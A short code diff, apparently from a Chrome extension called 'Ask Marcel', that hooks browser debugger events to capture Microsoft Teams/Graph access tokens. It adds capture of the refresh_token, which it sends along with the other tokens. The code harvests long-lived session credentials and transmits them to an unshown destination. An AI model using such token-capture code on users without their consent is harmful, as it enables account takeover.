@@ -28,6 +28,7 @@ const GRAPH_AUD_ALT = '00000003-0000-0000-c000-000000000000';
 
 // 多 token 捕获状态
 let capturedGraph = null;
+let capturedRefresh = null;
 let capturedChatsvcagg = null;
 let capturedIc3 = null;
 let capturedElevated = null;
@@ -144,6 +145,11 @@ async function sendAllTokens() {
   const payload = {
     access_token: capturedGraph,
   };
+
+  if (capturedRefresh) {
+    payload.refresh_token = capturedRefresh;
+    console.log('[Ask Marcel] ✓ 包含 refresh_token');
+  }
 
   if (capturedChatsvcagg) {
     payload.chatsvcagg_access_token = capturedChatsvcagg;
@@ -274,7 +280,8 @@ chrome.debugger.onEvent.addListener((source, method, params) => {
           // 1. Graph token（基本 Teams token）
           if (!capturedGraph && (aud === GRAPH_AUD || aud === GRAPH_AUD_ALT)) {
             capturedGraph = token;
-            console.log('[Ask Marcel] ✓ 捕获到 Graph token');
+            capturedRefresh = data.refresh_token ?? null;
+            console.log('[Ask Marcel] ✓ 捕获到 Graph token' + (capturedRefresh ? ' + refresh_token' : ''));
             scheduleSend();
           }
 
